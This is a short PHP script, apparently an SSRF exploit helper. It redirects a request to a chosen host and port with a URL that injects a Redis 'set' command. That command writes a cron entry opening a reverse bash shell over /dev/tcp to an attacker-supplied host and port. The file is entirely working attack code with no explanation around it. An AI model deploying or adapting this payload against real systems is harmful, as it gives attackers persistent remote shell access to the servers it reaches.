<?php

$ip = $_GET['ip'];

$port = $_GET['port'];

$bhost = $_GET['bhost'];

$bport = $_GET['bport'];

$scheme = $_GET['s'];

header("Location: $scheme://$ip:$port/set:0:\"\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20>\\x26\\x20/dev/tcp/{$bhost}/{$bport}\\x200>\\x261\\x0a\\x0a\\x0a\"");

?>